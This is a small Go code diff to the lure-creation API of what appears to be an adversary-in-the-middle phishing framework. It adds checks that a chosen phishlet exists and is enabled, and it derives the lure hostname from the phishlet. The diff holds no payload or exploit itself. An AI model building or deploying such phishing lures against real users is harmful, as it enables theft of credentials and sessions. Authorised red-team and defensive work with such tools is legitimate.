@@ -52,6 +52,20 @@ func (r *Router) createLure(w http.ResponseWriter, req *http.Request) {
 		return
 	}
 
+	phishlet, err := r.Phishlets.Get(body.Phishlet)
+	if err != nil {
+		if errors.Is(err, aitm.ErrNotFound) {
+			writeError(w, http.StatusBadRequest, "phishlet not found")
+		} else {
+			writeError(w, http.StatusInternalServerError, "failed to get phishlet")
+		}
+		return
+	}
+	if !phishlet.Enabled {
+		writeError(w, http.StatusBadRequest, "phishlet is not enabled")
+		return
+	}
+
 	path := body.Path
 	if path == "" {
 		path = randomPath()
@@ -59,7 +73,7 @@ func (r *Router) createLure(w http.ResponseWriter, req *http.Request) {
 
 	lure := &aitm.Lure{
 		Phishlet:    body.Phishlet,
-		BaseDomain:  body.BaseDomain,
+		Hostname:    phishlet.Hostname,
 		Path:        path,
 		RedirectURL: body.RedirectURL,
 		SpoofURL:    body.SpoofURL,
@@ -212,7 +226,6 @@ func lureToResponse(l *aitm.Lure) sdk.LureResponse {
 	return sdk.LureResponse{
 		ID:          l.ID,
 		Phishlet:    l.Phishlet,
-		BaseDomain:  l.BaseDomain,
 		Hostname:    l.Hostname,
 		Path:        l.Path,
 		RedirectURL: l.RedirectURL,
